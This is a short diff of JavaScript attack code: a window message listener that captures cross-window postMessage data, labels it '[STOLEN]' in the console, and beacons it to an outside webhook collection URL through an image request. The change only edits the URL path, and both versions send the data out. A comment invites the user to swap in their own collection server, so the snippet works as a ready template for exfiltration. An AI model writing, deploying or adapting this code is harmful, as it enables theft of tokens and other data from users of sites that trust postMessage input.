@@ -12,7 +12,7 @@ window.onmessage=function(m){
   try{
     var data=JSON.parse(m.data);
     // Send to collection server — REPLACE THIS URL
-    new Image().src='https://webhooksite.net/b8b3753d-1cde-4230-a753-be9019b9e967/collect?data='+encodeURIComponent(m.data);
+    new Image().src='https://webhooksite.net/b8b3753d-1cde-4230-a753-be9019b9e967?data='+encodeURIComponent(m.data);
     
     // Or just log it
     console.log('[STOLEN]',data);
